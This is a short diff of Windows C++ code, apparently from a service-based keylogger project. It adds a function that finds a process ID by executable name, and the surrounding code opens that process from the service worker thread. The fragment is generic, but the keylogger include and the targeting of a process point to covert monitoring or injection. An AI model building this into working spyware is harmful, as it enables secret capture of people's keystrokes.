@@ -1,5 +1,32 @@
 #include "svc.hpp"
 #include "../keylog/keylogger.h"
+#include <tlhelp32.h>
+
+
+DWORD FindTargetPID(const wchar_t* targetName)
+{
+	PROCESSENTRY32W pe;
+	pe.dwSize = sizeof(PROCESSENTRY32W);
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot == INVALID_HANDLE_VALUE)
+		return 0;
+
+	if (Process32FirstW(snapshot, &pe))
+	{
+		do
+		{
+			if (wcscmp(pe.szExeFile, targetName) == 0)
+			{
+				CloseHandle(snapshot);
+				return pe.th32ProcessID;
+			}
+		} while (Process32NextW(snapshot, &pe));
+	}
+
+	CloseHandle(snapshot);
+	return 0;
+}
 
 int InstallService()
 {
@@ -297,7 +324,7 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 		wprintf(_T("OpenProcess failed (%lu)\n"), GetLastError());
 		return 1;
 	}
-    
+
 
 
     // Obtenir le répertoire du service
